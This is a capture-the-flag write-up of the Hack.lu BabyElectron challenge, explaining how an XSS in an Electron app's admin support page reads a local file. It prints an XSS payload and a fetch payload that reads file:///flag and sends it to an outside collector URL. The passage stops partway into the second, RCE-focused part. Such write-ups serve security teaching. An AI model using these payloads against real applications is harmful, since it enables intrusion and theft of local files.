@@ -1,0 +1,506 @@
+<h1 id="babyelectron">BabyElectron</h1>
+
+<p>Hack.lu CTF had many very difficult web challenges, the BabyElectron challenge had the difficulty level set to (Easy,Medium)</p>
+
+<p>There were two challenges based on the same challenge, basically BabyElectronV1 and BabyElectronV2</p>
+
+<p>For solving the <em>BabyElectronV1</em> challenge we were required to read the file contents of the <code class="language-plaintext highlighter-rouge">flag</code> file , located under the root directory (<code class="language-plaintext highlighter-rouge">/flag</code>)
+The second one <em>BabyElectronV2</em> challenge revolve around getting RCE , in order to get the flag you need to execute the <code class="language-plaintext highlighter-rouge">/printflag</code> binary file which will echo out the flag.</p>
+
+<p>Three links were provided in these challenge:</p>
+
+<p>https://flu.xxx/static/chall/babyelectron_db68aab4272c385892ba665c4c0e6432.zip : Download challenge files (which contained the source code)
+https://relbot.flu.xxx/ : Report your Posts here (Submit a report id that the Admin Bot should visit:)
+https://flu.xxx/static/chall/REL-1.0.0.AppImage_v2 : Get the app here (From this file the electron can be directly run)</p>
+
+<p>I was on windows, so I didn’t tried the AppImage . Instead directly ran the electron app from the provided source code, as it will also allow me to add some debugging,etc.</p>
+
+<hr />
+
+<p>To start the electron app:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://flu.xxx/static/chall/babyelectron_db68aab4272c385892ba665c4c0e6432.zip
+unzip babyelectron_db68aab4272c385892ba665c4c0e6432.zip
+<span class="nb">cd</span> ./public/app
+npm i
+
+./node_modules/.bin/electron <span class="nb">.</span> <span class="nt">--disable-gpu</span> <span class="nt">--no-sandbox</span>
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/198924661-ba8fbddd-a716-4393-b2f9-f6850fe10d44.png" alt="image" /></p>
+
+<p>After login/register we can see there three pages:</p>
+
+<p>Home Page
+<img src="https://user-images.githubusercontent.com/31372554/198924790-830601e8-872b-40cf-bf8a-be4f8b6d7033.png" alt="image" /></p>
+
+<p>Buy Page
+<img src="https://user-images.githubusercontent.com/31372554/198924823-cb712d76-db0f-474b-b41a-df8e7ca695cc.png" alt="image" /></p>
+
+<p>My portfolio page
+<img src="https://user-images.githubusercontent.com/31372554/198924857-be81464c-87fe-4b62-92d4-588b9ab81b58.png" alt="image" /></p>
+
+<p>We can also report any House listing to the admin:</p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/198925697-c3895f77-a3e0-4a0f-b474-5b8c2e1fad96.png" alt="image" /></p>
+
+<p>Once we buy anything , it will appear under the <em>My portfolio page</em> , from there we can even sell the House:</p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/198925007-f6aefc57-c333-40bb-937c-0868d115eae2.png" alt="image" /></p>
+
+<hr />
+
+<p>We need to see the underlying requests responsible for all these actions, by adding these two line of code in  electron <code class="language-plaintext highlighter-rouge">main.js</code> file:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span><span class="nx">app</span><span class="p">,</span> <span class="nx">BrowserWindow</span><span class="p">,</span> <span class="nx">ipcMain</span><span class="p">,</span> <span class="nx">session</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">electron</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">path</span><span class="dl">'</span><span class="p">)</span>
+
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">commandLine</span><span class="p">.</span><span class="nf">appendSwitch</span><span class="p">(</span><span class="dl">'</span><span class="s1">proxy-server</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">127.0.0.1:8080</span><span class="dl">'</span><span class="p">)</span>  <span class="c1">// [1]</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">commandLine</span><span class="p">.</span><span class="nf">appendSwitch</span><span class="p">(</span><span class="dl">"</span><span class="s2">ignore-certificate-errors</span><span class="dl">"</span><span class="p">);</span> <span class="c1">// [2]</span>
+</code></pre></div></div>
+
+<p>Now restart the elctron application and now you should see the requests in the burp history</p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/198925372-36970fe9-c973-45c9-bdeb-5cb40f5d8435.png" alt="image" /></p>
+
+<hr />
+
+<p>As we now have a basic undestanding of the application, let’s dig into the source code to see where the bug lies:</p>
+
+<p>In case of electron application if you have a xss bug it can directly lead to RCE (if all the stars aligned correctly), so I started looking for xss in the sourec code.
+Remember the report endpoint? It also allowed us to add a message so let’s check if it can lead to xss bug or not.</p>
+
+<p><code class="language-plaintext highlighter-rouge">report.js</code></p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// get listing out of path</span>
+<span class="kd">let</span> <span class="nx">houseId</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URL</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">).</span><span class="nx">search</span>
+<span class="kd">let</span> <span class="nx">RELapi</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nf">getItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">api</span><span class="dl">"</span><span class="p">)</span>
+
+<span class="nx">report</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span> 
+    <span class="nf">fetch</span><span class="p">(</span><span class="nx">RELapi</span> <span class="o">+</span> <span class="s2">`/report</span><span class="p">${</span><span class="nx">houseId</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
+          <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span><span class="p">,</span>
+        <span class="p">},</span>
+        <span class="na">body</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">({</span>
+            <span class="na">message</span><span class="p">:</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">REL-msg</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span>
+        <span class="p">})}).</span><span class="nf">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nf">json</span><span class="p">())</span>
+        <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> 
+        <span class="c1">// redirect back to the main page</span>
+        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">`./index.html#</span><span class="p">${</span><span class="nx">data</span><span class="p">.</span><span class="nx">msg</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>    
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>A request to the api endpoint is made:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /report?houseId=WOomsaFlA HTTP/2
+Host: relapi.flu.xxx
+Content-Length: 17
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) REL/1.0.0 Chrome/94.0.4606.81 Electron/15.5.7 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+
+{"message":"zzz"}
+</code></pre></div></div>
+
+<p>This request is handle in this part of the code: <code class="language-plaintext highlighter-rouge">/api/server.js</code></p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/report</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+
+  <span class="kd">let</span> <span class="nx">houseId</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">houseId</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
+  <span class="kd">let</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">[</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">]</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
+
+  <span class="k">if </span><span class="p">(</span>
+    <span class="k">typeof</span> <span class="nx">houseId</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">string</span><span class="dl">"</span> <span class="o">||</span>
+    <span class="k">typeof</span> <span class="nx">message</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">string</span><span class="dl">"</span> <span class="o">||</span>
+    <span class="nx">houseId</span><span class="p">.</span><span class="nx">length</span> <span class="o">===</span> <span class="mi">0</span> <span class="o">||</span>
+    <span class="nx">message</span><span class="p">.</span><span class="nx">length</span> <span class="o">===</span> <span class="mi">0</span>
+  <span class="p">)</span>
+    <span class="k">return</span> <span class="nf">sendResponse</span><span class="p">(</span><span class="nx">res</span><span class="p">,</span> <span class="mi">400</span><span class="p">,</span> <span class="p">{</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid request</span><span class="dl">"</span> <span class="p">});</span>
+
+  <span class="c1">// allow only valid houseId's</span>
+  <span class="nx">db</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">SELECT * from RELhouses WHERE houseId = ?</span><span class="dl">"</span><span class="p">,</span> <span class="nx">houseId</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">house</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">house</span><span class="p">){</span>
+      <span class="kd">let</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nf">randomBytes</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="dl">"</span><span class="s2">hex</span><span class="dl">"</span><span class="p">);</span>
+      <span class="nx">db</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span>
+        <span class="dl">"</span><span class="s2">INSERT INTO RELsupport(reportId, houseId, message, visited) VALUES(?, ?, ?, ?)</span><span class="dl">"</span><span class="p">,</span>
+        <span class="nx">token</span><span class="p">,</span>
+        <span class="nx">houseId</span><span class="p">,</span>
+        <span class="nx">message</span><span class="p">,</span>
+        <span class="kc">false</span><span class="p">,</span>
+        <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+          <span class="k">if </span><span class="p">(</span><span class="nx">err</span><span class="p">){</span>
+            <span class="k">return</span> <span class="nf">sendResponse</span><span class="p">(</span><span class="nx">res</span><span class="p">,</span> <span class="mi">500</span><span class="p">,</span> <span class="p">{</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to file report</span><span class="dl">"</span> <span class="p">});</span>
+          <span class="p">}</span>
+          <span class="k">return</span> <span class="nf">sendResponse</span><span class="p">(</span><span class="nx">res</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="p">{</span><span class="na">msg</span><span class="p">:</span> <span class="s2">`Thank you for your Report!\nHere is your ID: </span><span class="p">${</span><span class="nx">token</span><span class="p">}</span><span class="s2">`</span><span class="p">})</span>  
+        <span class="p">})</span>
+      <span class="p">}</span>
+    <span class="k">else</span><span class="p">{</span>
+      <span class="k">return</span> <span class="nf">sendResponse</span><span class="p">(</span><span class="nx">res</span><span class="p">,</span> <span class="mi">500</span><span class="p">,</span> <span class="p">{</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to find that property</span><span class="dl">"</span> <span class="p">});</span>
+    <span class="p">}</span>
+  <span class="p">})</span>
+<span class="p">})</span>
+</code></pre></div></div>
+
+<p>It returns a token in the response, this token then can be supplied to the <code class="language-plaintext highlighter-rouge">/support</code> endpoint to retrive the report details:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"msg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Thank you for your Report!</span><span class="se">\n</span><span class="s2">Here is your ID: 553987ee78d0056533cf4dfcdc830ad1"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>https://relapi.flu.xxx/support?reportId=553987ee78d0056533cf4dfcdc830ad1</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w">
+  </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"price"</span><span class="p">:</span><span class="w"> </span><span class="mi">37855</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"6743 Impasse de Presbourg"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"message"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Sed voluptatem itaque necessitatibus itaque aut et ut esse."</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"sqm"</span><span class="p">:</span><span class="w"> </span><span class="mi">60</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"image"</span><span class="p">:</span><span class="w"> </span><span class="s2">"images/REL-221024.jpeg"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"houseId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"b0Hapli2VJ"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"msg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"xx"</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">]</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The admin bot available at: https://relbot.flu.xxx/ 
+<em>Submit a report id that the Admin Bot should visit:</em> , so no doubt it uses the report id to make a request to the <code class="language-plaintext highlighter-rouge">/support</code> endpoint</p>
+
+<p>This is code for the support page (from where the admin bot checks the report id):</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+  <span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"../css/bootstrap.min.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"../js/bootstrap.bundle.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"../styles.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;title&gt;</span>REL Admin<span class="nt">&lt;/title&gt;</span>
+  <span class="nt">&lt;/head&gt;</span>
+  <span class="nt">&lt;body&gt;</span>
+    REL Support Page<span class="nt">&lt;br&gt;</span>
+
+    Most recent reported Listing:
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span> <span class="na">id=</span><span class="s">"REL-content"</span><span class="nt">&gt;</span> 
+      <span class="c">&lt;!-- div for our houses --&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+
+    <span class="c">&lt;!-- You can also require other files to run in this process --&gt;</span>
+    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">"../js/purify.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"../js/support.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+    
+  <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">js/support.js</code></p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// support.js fetches next row from API in support and gives it back to the support admin to handle. </span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">WAITING FOR NEW INPUT</span><span class="dl">"</span><span class="p">)</span>
+
+<span class="kd">const</span> <span class="nx">reportId</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nf">getItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">reportId</span><span class="dl">"</span><span class="p">)</span>
+<span class="kd">let</span> <span class="nx">RELapi</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nf">getItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">api</span><span class="dl">"</span><span class="p">)</span>
+
+<span class="kd">const</span> <span class="nx">HTML</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">REL-content</span><span class="dl">"</span><span class="p">)</span>
+
+
+<span class="nf">fetch</span><span class="p">(</span><span class="nx">RELapi</span> <span class="o">+</span> <span class="s2">`/support?reportId=</span><span class="p">${</span><span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">reportId</span><span class="p">)}</span><span class="s2">`</span><span class="p">).</span><span class="nf">then</span><span class="p">((</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">data</span><span class="p">.</span><span class="nf">json</span><span class="p">()).</span><span class="nf">then</span><span class="p">((</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span><span class="p">{</span>
+  <span class="k">if</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">err</span><span class="p">){</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">API Error: </span><span class="dl">"</span><span class="p">,</span><span class="nx">data</span><span class="p">.</span><span class="nx">err</span><span class="p">)</span>
+    <span class="nx">new_msg</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">div</span><span class="dl">"</span><span class="p">)</span>
+    <span class="nx">new_msg</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">err</span>
+    <span class="nx">HTML</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">new_msg</span><span class="p">);</span>
+  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+  <span class="k">for </span><span class="p">(</span><span class="nx">listing</span> <span class="k">of</span> <span class="nx">data</span><span class="p">){</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Checking now!</span><span class="dl">"</span><span class="p">,</span> <span class="nx">listing</span><span class="p">.</span><span class="nx">msg</span><span class="p">)</span>
+    
+    <span class="c1">// security we learned from a bugbounty report</span>
+    <span class="nx">listing</span><span class="p">.</span><span class="nx">msg</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">listing</span><span class="p">.</span><span class="nx">msg</span><span class="p">)</span> <span class="c1">// [1]</span>
+
+    <span class="kd">const</span> <span class="nx">div</span> <span class="o">=</span> <span class="s2">`
+        &lt;div class="card col-xs-3" style="width: 18rem;"&gt;
+            &lt;span id="REL-0-houseId" style="display: none;"&gt;</span><span class="p">${</span><span class="nx">listing</span><span class="p">.</span><span class="nx">houseId</span><span class="p">}</span><span class="s2">&lt;/span&gt;
+            &lt;img class="card-img-top" id="REL-0-image" src="../</span><span class="p">${</span><span class="nx">listing</span><span class="p">.</span><span class="nx">image</span><span class="p">}</span><span class="s2">" alt="REL-img"&gt;
+            &lt;div class="card-body"&gt;
+              &lt;h5 class="card-title" id="REL-0-name"&gt;</span><span class="p">${</span><span class="nx">listing</span><span class="p">.</span><span class="nx">name</span><span class="p">}</span><span class="s2">&lt;/h5&gt;
+              &lt;h6 class="card-subtitle mb-2 text-muted" id="REL-0-sqm"&gt;</span><span class="p">${</span><span class="nx">listing</span><span class="p">.</span><span class="nx">sqm</span><span class="p">}</span><span class="s2"> sqm&lt;/h6&gt;
+              &lt;p class="card-text" id="REL-0-message"&gt;</span><span class="p">${</span><span class="nx">listing</span><span class="p">.</span><span class="nx">message</span><span class="p">}</span><span class="s2">&lt;/p&gt;
+              &lt;input type="number" class="form-control" id="REL-0-price" placeholder="</span><span class="p">${</span><span class="nx">listing</span><span class="p">.</span><span class="nx">price</span><span class="p">}</span><span class="s2">"&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div&gt;
+            </span><span class="p">${</span><span class="nx">listing</span><span class="p">.</span><span class="nx">msg</span><span class="p">}</span><span class="s2">
+        &lt;/div&gt;
+`</span>
+    <span class="nx">new_property</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">div</span><span class="dl">"</span><span class="p">)</span>
+    <span class="nx">new_property</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">div</span>
+    <span class="nx">HTML</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">new_property</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Done Checking!</span><span class="dl">"</span><span class="p">)</span>
+<span class="p">}</span>
+<span class="p">})</span>
+</code></pre></div></div>
+
+<p>This looked very interesting, it was making a request to the <code class="language-plaintext highlighter-rouge">/support</code> endpoint with the report Id we provided and the response is then directly passed to innerHTML (this can lead to xss if there is no sanization over user controllable input).</p>
+
+<p>Here we can say on line [1], the msg is passed to the Dompurify santize function which take cares of the xss bug.But other variables aren’t sanitized listing.houseId,listing.name,listing.price</p>
+
+<p>If we can get full control over any of these variable we will have a xss bug:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w">
+  </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"price"</span><span class="p">:</span><span class="w"> </span><span class="mi">37855</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"6743 Impasse de Presbourg"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"message"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Sed voluptatem itaque necessitatibus itaque aut et ut esse."</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"sqm"</span><span class="p">:</span><span class="w"> </span><span class="mi">60</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"image"</span><span class="p">:</span><span class="w"> </span><span class="s2">"images/REL-221024.jpeg"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"houseId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"b0Hapli2VJ"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"msg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"xx"</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">]</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Request made when sell action is performed:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /sell HTTP/2
+Host: relapi.flu.xxx
+Content-Length: 117
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) REL/1.0.0 Chrome/94.0.4606.81 Electron/15.5.7 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+
+{
+  "houseId": "_yTPmi9bfl",
+  "token": "61e6887048465eed383d6d9f5cd32c86",
+  "message": "A commodi debitis ut.&lt;img src=x onerror=alert()&gt;",
+  "price": "1"
+}
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">houseId</code> is validated  and the <code class="language-plaintext highlighter-rouge">price</code> param value is converted to Integer so we can’t put xss payload there. The <code class="language-plaintext highlighter-rouge">message</code> is the last option and it happily accepts our xss payload input.</p>
+
+<p>Steps to create a report id which would have our xss payload:</p>
+
+<p>1.Buy a house (if you don’t buy anything, you won’t have anything to sell)
+2.Sell the house (this is where we will add our xss payload)
+3.Report the <code class="language-plaintext highlighter-rouge">houseId</code> which we modified in <em>step 2</em></p>
+
+<p>Send the <code class="language-plaintext highlighter-rouge">reportId</code> to the admin then.</p>
+
+<p>By this way although we have found a successful xss bug, we still need to find a away to read the flag which is in root directory <code class="language-plaintext highlighter-rouge">/flag</code></p>
+
+<hr />
+
+<p>By pressing <code class="language-plaintext highlighter-rouge">CTRL+Shift+I</code> in the electron app , developer tools window will popup</p>
+
+<p>Execute this on the console:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span>
+<span class="dl">'</span><span class="s1">file:///tmp/CTFs/2022/Hack.lu/babyelectron_db68aab4272c385892ba665c4c0e6432/public/app/src/views/portfolio.html#</span><span class="dl">'</span>
+</code></pre></div></div>
+
+<p>The local files are directly loaded here, so the location of page where our report will be shown will be this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'file:///tmp/CTFs/2022/Hack.lu/babyelectron_db68aab4272c385892ba665c4c0e6432/public/app/src/views/support.html#'
+</code></pre></div></div>
+
+<p>Here’s the sweet alert popup:
+<img src="https://user-images.githubusercontent.com/31372554/198938310-2f106dd3-8dab-42aa-9e48-03a6cace8287.png" alt="electron_O5t35dNFpM" /></p>
+
+<p>As we have xss in the file uri, we can make request to other local files and read the content. A simple js payload such as this will allows us to read the flag:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">file:///flag</span><span class="dl">'</span><span class="p">)</span>
+   <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">response</span><span class="o">=&gt;</span><span class="nx">response</span><span class="p">.</span><span class="nf">text</span><span class="p">())</span>
+   <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">json</span><span class="o">=&gt;</span><span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://en2celr7rewbul.m.pipedream.net/x?flag=</span><span class="dl">"</span><span class="o">+</span><span class="nx">json</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>This code will read the content of the flag file and sent it to our server.</p>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/198938921-d6a8ceef-a3ca-42b1-8b8f-0d66889ae9ee.png" alt="image" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">flag{well..well..well..good_you_learned_about_file://_origin_:)_}</code></p>
+
+<hr />
+
+<h1 id="v2">v2</h1>
+
+<p>Now we need rce to solve the second part of this challenge, going through electron source code</p>
+
+<p>Starting with the <code class="language-plaintext highlighter-rouge">webPreferences</code> configuration:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">createWindow</span> <span class="p">(</span><span class="nx">session</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// Create the browser window.</span>
+  <span class="kd">const</span> <span class="nx">mainWindow</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BrowserWindow</span><span class="p">({</span>
+    <span class="na">title</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Real Estate Luxembourg</span><span class="dl">"</span><span class="p">,</span>
+    <span class="na">width</span><span class="p">:</span> <span class="mi">860</span><span class="p">,</span>
+    <span class="na">height</span><span class="p">:</span> <span class="mi">600</span><span class="p">,</span>
+    <span class="na">minWidth</span><span class="p">:</span> <span class="mi">860</span><span class="p">,</span>
+    <span class="na">minHeight</span><span class="p">:</span> <span class="mi">600</span><span class="p">,</span>
+    <span class="na">resizable</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+    <span class="na">icon</span><span class="p">:</span> <span class="dl">'</span><span class="s1">/images/fav.ico</span><span class="dl">'</span><span class="p">,</span>
+    <span class="na">webPreferences</span><span class="p">:</span> <span class="p">{</span>
+      <span class="na">preload</span><span class="p">:</span> <span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nx">app</span><span class="p">.</span><span class="nf">getAppPath</span><span class="p">(),</span> <span class="dl">"</span><span class="s2">./src/preload.js</span><span class="dl">"</span><span class="p">),</span> <span class="c1">// eng-disable PRELOAD_JS_CHECK</span>
+      <span class="c1">// SECURITY: use a custom session without a cache</span>
+      <span class="c1">// https://github.com/1password/electron-secure-defaults/#disable-session-cache</span>
+      <span class="nx">session</span><span class="p">,</span>
+      <span class="c1">// SECURITY: disable node integration for remote content</span>
+      <span class="c1">// https://github.com/1password/electron-secure-defaults/#rule-2</span>
+      <span class="na">nodeIntegration</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+      <span class="c1">// SECURITY: enable context isolation for remote content</span>
+      <span class="c1">// https://github.com/1password/electron-secure-defaults/#rule-3</span>
